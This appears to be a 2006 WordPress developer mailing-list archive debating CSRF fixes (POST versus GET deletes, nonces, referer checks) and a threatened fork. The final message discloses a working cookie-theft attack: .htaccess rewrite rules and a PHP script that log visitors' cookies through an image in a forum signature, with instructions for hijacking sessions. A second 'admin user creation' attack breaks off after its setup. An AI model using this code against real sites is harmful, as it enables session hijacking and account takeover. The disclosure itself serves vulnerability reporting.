> http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
--Robert Deaton
http://somethingunpredictable.com
From ryan at concept64.com  Mon Apr 24 15:18:32 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Mon Apr 24 15:22:42 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>	<444CE689.6050202@midnightcircus.com>
	<444CEA40.30708@concept64.com>
	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>
Message-ID: <444CEC48.9060309@concept64.com>

Rob Mientjes wrote:
> On 24/04/06, Ryan Scheuermann <ryan@concept64.com> wrote:
>   
>> Drop the buttons for "Delete" completely and make checkboxes for each,
>> with a "Delete Posts" submit button on the bottom of the page?  We
>> already do this on the Manage Bookmarks page and it's actually more
>> user-friendly because you can delete multiple posts/pages at once.
>> Plus, it slightly curbs people with Javascript disabled or JS problems
>> from accidentally clicking the "Delete" button and with no confirmation
>> popup from "poof" post gone, sorry.  And that would also remove the need
>> for the AJAX list management code, or we could still use AJAX for the
>> form submit...
>> <snip />
>> Or, we don't allow approving comments from emails, but we provide a link
>> to WP Admin where you can (using a POST).  I don't know, I'm all about
>> the aesthetically pleasing GUI, but this seems a little trivial for
>> something that can be accomplished with REST and still be aesthetically
>> pleasing with checkboxes.
>>     
>
> The question is: is it feasible? I mean, checkboxes are intended for
> selected mass... er... selection. Do people really delete three or
> fifteen posts at a time? How great is the need for a mass edit
> interface with posts, as compared to bookmarks and comments?
>
> -Rob.
>   
Really, it's just a difference between two clicks or one.   Mass delete 
may not be "needed" but it's certainly giving the user an ability they 
didn't have before.  And it does solve the problem of making the Delete 
action distinct from the Edit link.

Ryan Scheuermann
From dstewart at atl.lmco.com  Mon Apr 24 15:19:08 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Mon Apr 24 15:23:23 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CE7F9.3000300@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
	<444CBFA1.7080405@midnightcircus.com>
	<444CC938.7040908@metalab.unc.edu> <444CCBDE.5050705@atl.lmco.com>
	<444CD748.30306@metalab.unc.edu> <444CDE1E.1020202@atl.lmco.com>
	<444CE7F9.3000300@metalab.unc.edu>
Message-ID: <444CEC6C.5050000@atl.lmco.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Elliotte Harold wrote:
> That ideal assumes people want the same thing. Sometimes different
> groups have different needs, and require different products to satisfy
> those needs. One system cannot be everything to every one. NetBSD,
> FreeBSD, and OpenBSD are good examples. They are different projects with
> different motivations and criteria. If you want portability pick NetBSD.
>  If you want security pick OpenBSD. If you want performance on X86, pick
> FreeBSD. Three different products forked form the same code base because
> different people have different needs and criteria for choosing an OS.
> 

Not quite the same thing.  You're a step removed in this case - your
analogy applies to WP and b2evolution forking off of b2.  We're not
talking about use cases here, nor are we talking about offering
specialized version of WP, we're arguing over a core admin procedure.

If you can find a group of people that want a php5-only version of
WordPress that only uses POST in the admin interface, well then, *BSD away!

> 
>> This selfishly (on your part) forces the devs to keep track of your
>> fork, as well as every other WP-related fork out there.  You've turned
>> core WP development into an ineffecient "pull" model instead of the
>> preferred "push" one.  The fact of the matter is that you claim to have
>> coded around the very subject of this extremely long thread, thus you
>> MUST have code that accomplishes such.  Go to Trac, submit a .diff
>> attached to a ticket and then let the chips fall where they may.  To
>> huffily reply that it's the duty of the WP devs to come looking for your
>> code is the height of arrogance, once again IMNSHO.
> 
> 
> Point of order: I've claimed no such thing. I have described a
> reasonable prophylatic measure that can be taken within the current code
> base to protect yourself from the two attacks discovered so far. Simply:
> 

Bollocks.  To quote you:

"Since WordPress is wisely published under the GPL, any changes I
publish in any hypothetical fork will be freely available to the core
developers if they decide to incorporate them. Certainly if I discover
any major bugs I'll report them to the core. However most of what I want
to do are changes that the core team have already explicitly rejected.
(e.g. cookie-free authentication, removing unsafe GETs, requiring PHP 5,
etc.) "

I reiterate: you won't submit code to Trac, because you feel that you'll
be ingored by the devs w/commit access (a valid concern, certainly,
since your development priorities don't line up with Matt & Ryan's).
Shy of someone on the WP side of things keeping track (no pun intended)
of your code repo and commit logs, how is that code supposed to migrate
its way into the WP codebase?

> 1. Don't allow img elements in comments
> 2. Don't give 3rd parties contributor rights
> 3. Don't follow 3rd party links from the comment moderation page.
> 
> So far, none of this requires a patch; but this is all a kludge we'd
> rather not have to take. It should be possible to give third parties
> contributor rights. It should be safe to follow 3rd party links from the
> admin pages. Making this safe requires changing the code.
> 
> The core team seems to want to implement a complex nonce based solution.
> I suspect there's a simpler, more robust solution using POST instead of
> GET. Whether I write the code to implement that solution depends on a
> variety of factors. However when the core team has been quite clear that
> they do not intend to accept a POST solution no matter what, then
> patches are not an option. There's no point in wasting my time and
> theirs cluttering TRAC with patches they've already said they'll reject.
> If they change their minds, I'll submit what I write; but given the
> current situation, the question is not patch or don't patch. The
> question is fork or do nothing.
> 

I disagree. If you can come up with a POST-based solution that fits into
the user-friendly format the WP team is trying to maintain (easy admin
email links, etc.), then I'm sure they'd love to see your code.  The
nonce solution is obviously a complex one that, to me, seems to be
making the most of a bad lot.

- --
- ----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.6 (GNU/Linux)
Comment: Using GnuPG with Red Hat - http://enigmail.mozdev.org

iD8DBQFETOxsN50Q8DVvcvkRApgkAJ4noulrsmC2KJf1uLgIQSkypwKL8ACfWYuq
8CCHj8c3TpP35SMhzSV5m1k=
=gAAq
-----END PGP SIGNATURE-----
From mike at zed1.com  Mon Apr 24 15:22:59 2006
From: mike at zed1.com (Mike Little)
Date: Mon Apr 24 15:27:15 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CEB7C.5040301@concept64.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
	<444CBFA1.7080405@midnightcircus.com>
	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>
	<444CE689.6050202@midnightcircus.com> <444CEA40.30708@concept64.com>
	<444CEB7C.5040301@concept64.com>
Message-ID: <7235ce780604240822g134dadberf388039d20167670@mail.gmail.com>

On 4/24/06, Ryan Scheuermann <ryan@concept64.com> wrote:
> Wait a minute, on the Manage Bookmarks page, there is actually a Delete
> link AND a checkbox with a form submit!  Does that seem redundant to
> anyone else?
>
> Ryan Scheuermann

With bookmarks the one thing you can't do en masse is delete. The
check box is to allow you to select multiple bookmarks for other
actions.

Or, at least that's how it used to be.

Mike
--
Mike Little
http://zed1.com/
From ryan at concept64.com  Mon Apr 24 15:25:45 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Mon Apr 24 15:29:55 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <7235ce780604240822g134dadberf388039d20167670@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>	<444CE689.6050202@midnightcircus.com>
	<444CEA40.30708@concept64.com>	<444CEB7C.5040301@concept64.com>
	<7235ce780604240822g134dadberf388039d20167670@mail.gmail.com>
Message-ID: <444CEDF9.9090509@concept64.com>

Mike Little wrote:
> On 4/24/06, Ryan Scheuermann <ryan@concept64.com> wrote:
>   
>> Wait a minute, on the Manage Bookmarks page, there is actually a Delete
>> link AND a checkbox with a form submit!  Does that seem redundant to
>> anyone else?
>>
>> Ryan Scheuermann
>>     
>
> With bookmarks the one thing you can't do en masse is delete. The
> check box is to allow you to select multiple bookmarks for other
> actions.
>
> Or, at least that's how it used to be.
>
> Mike
>   
I think you're right Mike for previous versions, but I'm looking at 
Manage Bookmarks on 2.1-alpha1 and I see checkboxes for only one action: 
delete.  :-)

Ryan
From robmientjes at gmail.com  Mon Apr 24 15:26:53 2006
From: robmientjes at gmail.com (Rob Mientjes)
Date: Mon Apr 24 15:31:00 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CEC48.9060309@concept64.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
	<444CBFA1.7080405@midnightcircus.com>
	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>
	<444CE689.6050202@midnightcircus.com> <444CEA40.30708@concept64.com>
	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>
	<444CEC48.9060309@concept64.com>
Message-ID: <e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>

On 24/04/06, Ryan Scheuermann <ryan@concept64.com> wrote:
> Really, it's just a difference between two clicks or one.   Mass delete
> may not be "needed" but it's certainly giving the user an ability they
> didn't have before.  And it does solve the problem of making the Delete
> action distinct from the Edit link.

Okay, that makes sense. You're quite right, in fact. I don't see why
this specific change can't be implemented. This needs no confirmation
e-mails or other silliness; post delete deserves POST.

-Rob.
From elharo at metalab.unc.edu  Mon Apr 24 15:31:58 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Mon Apr 24 15:36:31 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CEC6C.5050000@atl.lmco.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<444CC938.7040908@metalab.unc.edu>
	<444CCBDE.5050705@atl.lmco.com>	<444CD748.30306@metalab.unc.edu>
	<444CDE1E.1020202@atl.lmco.com>	<444CE7F9.3000300@metalab.unc.edu>
	<444CEC6C.5050000@atl.lmco.com>
Message-ID: <444CEF6E.2080409@metalab.unc.edu>

Doug Stewart wrote:

> I reiterate: you won't submit code to Trac, because you feel that you'll
> be ingored by the devs w/commit access (a valid concern, certainly,
> since your development priorities don't line up with Matt & Ryan's).
> Shy of someone on the WP side of things keeping track (no pun intended)
> of your code repo and commit logs, how is that code supposed to migrate
> its way into the WP codebase?
> 

It isn't. The core team has already considered and rejected a lot of the 
options I want. That's OK. It's their project. They're under no 
obligation to accept patches, and because WordPress is free software, I 
and others are free to work on the code elsewhere if we feel so 
inclined. The problem is not that I'm being ignored. It's that the 
features I want have already been considered and rejected. The only 
options left are to accept that decision or fork.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From ryan at concept64.com  Mon Apr 24 15:44:35 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Mon Apr 24 15:48:47 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>	<444CE689.6050202@midnightcircus.com>
	<444CEA40.30708@concept64.com>	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>	<444CEC48.9060309@concept64.com>
	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>
Message-ID: <444CF263.8000006@concept64.com>

Rob Mientjes wrote:
> On 24/04/06, Ryan Scheuermann <ryan@concept64.com> wrote:
>   
>> Really, it's just a difference between two clicks or one.   Mass delete
>> may not be "needed" but it's certainly giving the user an ability they
>> didn't have before.  And it does solve the problem of making the Delete
>> action distinct from the Edit link.
>>     
>
> Okay, that makes sense. You're quite right, in fact. I don't see why
> this specific change can't be implemented. This needs no confirmation
> e-mails or other silliness; post delete deserves POST.
>
> -Rob.
>   
I mean, using a checkbox form for post delete solves a lot of the 
current issues:

1. post/page delete uses POST and HTTP spec is not violated!  hay!
2. no worries about a consistent looking form button across browsers if 
there is only 1 on the bottom of the page
3. no need for nonces if the delete action requires POST
4. no security issues because links can't POST (security being the 
original concern of this thread)
5. adds new functionality for mass delete of posts (even if not needed)
6. no accidental deletions with Javascript disabled/missing
7. follows a widely accepted and user-friendly model for web applications

Are there any other angles we haven't thought of?

Ryan
From ringmaster at midnightcircus.com  Mon Apr 24 16:02:46 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Mon Apr 24 16:02:53 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CF263.8000006@concept64.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>	<444CE689.6050202@midnightcircus.com>	<444CEA40.30708@concept64.com>	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>	<444CEC48.9060309@concept64.com>	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>
	<444CF263.8000006@concept64.com>
Message-ID: <444CF6A6.9010002@midnightcircus.com>

Ryan Scheuermann wrote:
> I mean, using a checkbox form for post delete solves a lot of the 
> current issues:

> 3. no need for nonces if the delete action requires POST

Using POST does not obviate nonces or referer checks.  If someone were 
to create a form on a different site that POSTed the right info to the 
page that deletes your posts, and then tricked you into clicking it 
somehow, it would delete the posts.  And we're talking about deleting 
more than one post now?  Yikes.  Yes, it would work with just the 
referer check, but then that form would only work in environments that 
support the referer.  That is what the nonces are for, to replace 
referer checks with something more available.

Using POST does not obviate nonces or referer checks.

> 5. adds new functionality for mass delete of posts (even if not needed)

Oops.  I just accidentally deleted <s>that one post</s> *everything*. 
Oh, dear.
Time to revisit this:
http://www.asktog.com/columns/069ScottAdamsMeltdown.html

> 7. follows a widely accepted and user-friendly model for web applications

It also makes it very difficult to insert new per-row POST forms, if 
that's something we might ever consider in the future.  As unlikely as 
that might be.  Although, I do remember code around in one of these 
tables that let you add new columns in a clever way.  Might have been 
the Manage Posts page.

Owen




From ryan at ryanduff.net  Mon Apr 24 16:13:08 2006
From: ryan at ryanduff.net (Ryan Duff)
Date: Mon Apr 24 16:17:27 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CEF6E.2080409@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<444CC938.7040908@metalab.unc.edu>	<444CCBDE.5050705@atl.lmco.com>	<444CD748.30306@metalab.unc.edu>	<444CDE1E.1020202@atl.lmco.com>	<444CE7F9.3000300@metalab.unc.edu>	<444CEC6C.5050000@atl.lmco.com>
	<444CEF6E.2080409@metalab.unc.edu>
Message-ID: <444CF914.7000805@ryanduff.net>

Elliotte Harold wrote:
> Doug Stewart wrote:
> 
>> I reiterate: you won't submit code to Trac, because you feel that you'll
>> be ingored by the devs w/commit access (a valid concern, certainly,
>> since your development priorities don't line up with Matt & Ryan's).
>> Shy of someone on the WP side of things keeping track (no pun intended)
>> of your code repo and commit logs, how is that code supposed to migrate
>> its way into the WP codebase?
>>
> 
> It isn't. The core team has already considered and rejected a lot of the 
> options I want. That's OK. It's their project. They're under no 
> obligation to accept patches, and because WordPress is free software, I 
> and others are free to work on the code elsewhere if we feel so 
> inclined. The problem is not that I'm being ignored. It's that the 
> features I want have already been considered and rejected. The only 
> options left are to accept that decision or fork.
> 

Is it just me or does it seem like every 6 months someone comes in and 
makes a big deal about nothing, then when the dev team decides against 
them, they threaten to fork?

Forking is not a threat!

If you don't like the direction something is going, the devs don't want 
your work, Fork. Fork and shut up about it. This has to be the longest 
going thread ever. Only because you keep coming back and replying with 
the same thing to everyone's message.

-- 
Ryan Duff
http://ryanduff.net
AIM: ryancduff
irc.freenode.net #wordpress #plogger
From ryan at concept64.com  Mon Apr 24 16:13:58 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Mon Apr 24 16:18:09 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CF6A6.9010002@midnightcircus.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>	<444CE689.6050202@midnightcircus.com>	<444CEA40.30708@concept64.com>	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>	<444CEC48.9060309@concept64.com>	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>	<444CF263.8000006@concept64.com>
	<444CF6A6.9010002@midnightcircus.com>
Message-ID: <444CF946.6090705@concept64.com>

Owen Winkler wrote:
> Ryan Scheuermann wrote:
>> 3. no need for nonces if the delete action requires POST
>
> Using POST does not obviate nonces or referer checks.  If someone were 
> to create a form on a different site that POSTed the right info to the 
> page that deletes your posts, and then tricked you into clicking it 
> somehow, it would delete the posts.  And we're talking about deleting 
> more than one post now?  Yikes.  Yes, it would work with just the 
> referer check, but then that form would only work in environments that 
> support the referer.  That is what the nonces are for, to replace 
> referer checks with something more available.
>
> Using POST does not obviate nonces or referer checks.
>
You're right, I forgot about CSRF.  So we keep nonces.  But with this 
solution, we could still use POST - even with nonces - which would 
remove the "click bad comment link -> delete my blog" security hole.  
BTW, what's the official name for this security issue?
>> 5. adds new functionality for mass delete of posts (even if not needed)
>
> Oops.  I just accidentally deleted <s>that one post</s> *everything*. 
> Oh, dear.
> Time to revisit this:
> http://www.asktog.com/columns/069ScottAdamsMeltdown.html
>
If the checkboxes were only used for delete and we didn't have a 
"check/uncheck all" button, how would the user accidentally delete 
everything?  They would have to click through every checkbox "on 
accident" and then "on accident" click the Delete Checked Posts form 
submit button on the bottom of the page.  I'd like to meet the user that 
accidentally does this.  :-)
>> 7. follows a widely accepted and user-friendly model for web 
>> applications
>
> It also makes it very difficult to insert new per-row POST forms, if 
> that's something we might ever consider in the future.  As unlikely as 
> that might be.  Although, I do remember code around in one of these 
> tables that let you add new columns in a clever way.  Might have been 
> the Manage Posts page.
>
> Owen
>
Making it difficult for a future "maybe" doesn't seem like a good reason 
not to do it.

Don't get me wrong Owen, I'm not trying to throw more flames on this 
fire, I'm just trying to present a solution that might be acceptable to 
the masses without stepping on developers toes or result in (gasp!) 
forking the project for no reason.

Ryan
From ryan at concept64.com  Mon Apr 24 16:26:19 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Mon Apr 24 16:30:29 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CF6A6.9010002@midnightcircus.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>	<444CE689.6050202@midnightcircus.com>	<444CEA40.30708@concept64.com>	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>	<444CEC48.9060309@concept64.com>	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>	<444CF263.8000006@concept64.com>
	<444CF6A6.9010002@midnightcircus.com>
Message-ID: <444CFC2B.4080001@concept64.com>

Owen wrote:
> Using POST does not obviate nonces or referer checks.  If someone were 
> to create a form on a different site that POSTed the right info to the 
> page that deletes your posts, and then tricked you into clicking it 
> somehow, it would delete the posts.  And we're talking about deleting 
> more than one post now?  Yikes.  Yes, it would work with just the 
> referer check, but then that form would only work in environments that 
> support the referer.  That is what the nonces are for, to replace 
> referer checks with something more available.
>
> Using POST does not obviate nonces or referer checks.
>
> Owen
>
I do think having nonces would be beneficial for security 
authentication, but only implementing nonces to patch something that 
could be fixed with a simple POST vs GET solution does seems like 
overkill.  And (I'm not taking /his/ side but) who knows, doing deletes 
on a GET request may present even more problems down the road that we 
aren't foreseeing now - even with nonces implemented. 

Nonces are a big step and require a lot of testing and code rework.  I 
know that's already in the works, but simply replacing a delete link 
with a checkbox-based POST form seems a lot less "involved" to me - and 
does seem like the /right/ way of doing things.  But I don't know, I 
can't see all the /problems/ with using a checkbox form yet.  Forgive me 
if I sound like I'm attacking, I'm really not.  I promise.  :-)

Ryan
From Brian at TheCodeCave.com  Mon Apr 24 16:35:35 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Mon Apr 24 16:39:51 2006
Subject: [wp-hackers] RE: A quick update on the security issue I'd mentioned
	today
In-Reply-To: <000801c66799$ce1e5770$0664a8c0@tiger1>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98090@dsimail.drbsystems.com>

OK Sorry for the delay.  My wife's parents are coming into town and the
"Honey do..." list grew quite large.
 
I haven't moved much further on this, and I'm not sure that I am going to
have time to do - for a few days anyway.
 
Plus I've discovered a limiting factor that reduces the circumstances under
which this attack can be used.  That means I feel better about disclosing
this all.
 
Saturday morning when I looked at this with a fresh pair of eyes, I noticed
that the test that I'd written to verify that I'd stolen a cookie from my
wife's blog actually matched the cookies from my own blog.  Basically the
cookie serving was according to the value in _SERVER's HTTP_HOST setting NOT
the referrer setting.  That is VERY good for security.  It adds one more
requirement for the attack.  The file that does the post MUST be somewhere
on the server being attacked OR the cookie content an admin must be snatched
some other way so that it can be completely rebuilt and submitted with the
post.
 
It turns out that I share my file space with others apparently more freely
than I should.  I'd thought I'd done a fairly good job of protecting myself.
I give access to a FTP address with a password that ONLY allows access to
that directory.  The directory is outside of all of my website directory
trees.  This way if tries to do something that tunnels upwards, it won't
work.  However, I do allow http access to it from that domain through a
symbolic link.  As a result, I've been able to harvest user cookies from
VBulletin.  It's all done through an image in my sig and would be able to
harvest them from WordPress as well.  This means my user-add-and-upgrade
attack would work as described in the first email, assuming a php file can
be placed anywhere on the server accessible through PHP.  This includes in a
theme or plugin directory OR in a website you are dynamically mirroring for
someone through htaccess.
-
Here are the details of the attacks.  I'll let others play with it more.  I
don't have time at the moment.  I'll let you all research the details of the
calls too.
 
COOKIE THEFT attack.
On your own server create a directory.  Name it similar to a real directory
(imgs instead of images)
Create  a .htaccess file with the following content:
 

RewriteEngine On
RewriteCond %{HTTP_REFERER} (com) [NC]
RewriteCond /imgs/%{REQUEST_FILENAME} !-f
RewriteRule ^(.+)
<http://www.SERVERTOBEATTACKED.com/PATHTOATTACKPHP/ATTACKFILE.php?referrer=%
{HTTP_REFERER}&file=%{REQUEST_FILENAME>
http://www.SERVERTOBEATTACKED.com/PATHTOATTACKPHP/ATTACKFILE.php?referrer=%{
HTTP_REFERER}&file=%{REQUEST_FILENAME} [L]
 
RewriteEngine On
RewriteCond /remapper/%{REQUEST_FILENAME} !-f
RewriteRule ^(.+)  <http://www.ANYURLTOAREALIMAGE.com/images/smeg.jpg>
http://www.ANYURLTOAREALIMAGE.com/images/smeg.jpg

Place on the server to be attacked a file with the following code:

<?PHP
  $UrlParts = parse_url($referrer);
  $HistoryFileName = "cookies_".$UrlParts["host"].".htm";
  ignore_user_abort(true);    ## prevent refresh from aborting file
operations and hosing file
  $fh = fopen($HistoryFileName, "a+");
  if ($fh) {
    if (flock($fh, LOCK_EX)){    ## don"t do anything unless lock is
successful
      foreach ( $_COOKIE as $ind=>$val )
        fwrite($fh, "$ind=$val;  <br />\r\n");
      fwrite($fh,
"---------------------------------------------------------------------------
-------------  <br />\r\n  <br />\r\n  <br />\r\n  <br />\r\n");
      fflush($fh);
      ftruncate($fh, ftell($fh));
      flock($fh, LOCK_UN);
    }
    fclose($fh);
  }
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,"
<http://www.anyurltoarealimage.com/images/smeg.jpg>
http://www.ANYURLTOAREALIMAGE.com/images/smeg.jpg");
  curl_exec ($ch);
  curl_close ($ch);
?>

Now, put an image in your sig that points to any file in the imgs (whatever)
directory.  The resulting image that will be seen will be in the images
directory and that is not likely to be noticed.  Then you don't even have to
log in again. Just sit back refresh your browser as cookies are appended to
the htm history files.  When you find one with a low number, replace the
info in your own cookie and visit the sit.  You'll find you can log in as
that user just fine.  BTW, even if they did not choose to save the password
when they visited the site, this still works fine.  And as long as the
cookie file you are editing on your own PC was set to log you in everytime,
you can edit it and log in as them automatically everytime.
 
 
 
 
Admin User Creation attack
On your own server, create a directory.  Name it similar to a real directory
(e.g. imgs instead of images).
Create  an .htaccess file with the following content:

RewriteEngine On
RewriteCond %{HTTP_REFERER} (com) [NC]
RewriteCond /imgs/%{REQUEST_FILENAME} !-f
RewriteRule ^(.+)
<http://www.servertobeattacked.com/PATHTOATTACKPHP/ATTACKFILE.php?referrer=%
{HTTP_REFERER}&file=%{REQUEST_FILENAME>
http://www.SERVERTOBEATTACKED.com/PATHTOATTACKPHP/ATTACKFILE.php?referrer=%{
HTTP_REFERER}&file=%{REQUEST_FILENAME} [L]
 
RewriteEngine On
RewriteCond /remapper/%{REQUEST_FILENAME} !-f
RewriteRule ^(.+)  <http://www.ANYURLTOAREALIMAGE.com/images/smeg.jpg>
http://www.ANYURLTOAREALIMAGE.com/images/smeg.jpg

Place on the server to be attacked a file with the following code: (This can
be on your own server if you've already stolen a cookie)

<?PHP
 
// ADD A CHECK HERE FOR THE WP ADMIN USER
// Just display the image if the name is not admin or if the user is not 1
 
